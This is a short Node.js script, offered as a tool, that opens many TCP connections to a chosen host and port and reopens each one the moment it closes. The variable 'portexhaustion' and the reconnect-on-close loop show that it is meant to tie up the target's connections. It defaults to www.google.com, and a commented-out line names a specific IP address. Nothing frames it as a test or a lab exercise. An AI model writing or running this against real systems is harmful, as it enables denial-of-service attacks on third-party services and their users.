#!/usr/bin/env nodejs
var net = require('net');

var args = process.argv.slice();

console.log(args);

var target = args[2] || 'www.google.com'
var port = args[3] || 80
var portexhaustion = args[4]-1 || 9

//var target = '52.183.253.208'
//var port = 2800

function opensocket(){
        var client = new net.Socket();
        client.connect(port, target, function() {
                //console.log('Connected');
                //client.write('Hello, server! Love, Client.');
        });

        client.on('data', function(data) {
                //console.log('Received: ' + data);
                //client.destroy(); // kill client after server's response
        });

        client.on('error', function(ex){
                //console.log(ex);
        });
        client.on('close', function(ex){
                client.connect(port, target);
        });
}

var i = 0;
var loopcount = portexhaustion;
while (i <= loopcount){
  //console.log(i)
  opensocket();
  i++;
  
}

//client.on('close', function() {
//      console.log('Connection closed');
//});
